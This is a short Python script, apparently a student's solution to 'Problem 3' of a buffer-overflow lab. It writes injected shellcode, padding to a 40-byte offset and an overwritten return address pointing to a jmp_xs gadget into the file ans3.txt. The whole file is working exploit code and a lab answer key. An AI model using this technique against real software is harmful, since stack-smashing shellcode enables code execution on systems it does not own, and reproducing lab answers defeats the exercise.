import struct

# 手动编译好的 Shellcode (对应上面的汇编)
# 48 c7 c7 72 00 00 00 -> mov rdi, 0x72
# 48 c7 c0 16 12 40 00 -> mov rax, 0x401216
# ff d0                -> call rax
shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0"

# 偏移量 40
padding = b"A" * (40 - len(shellcode))

# jmp_xs 地址 0x401334
jmp_xs = struct.pack("<Q", 0x401334)

payload = shellcode + padding + jmp_xs

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Problem 3 Payload (Manual) 已生成至 ans3.txt")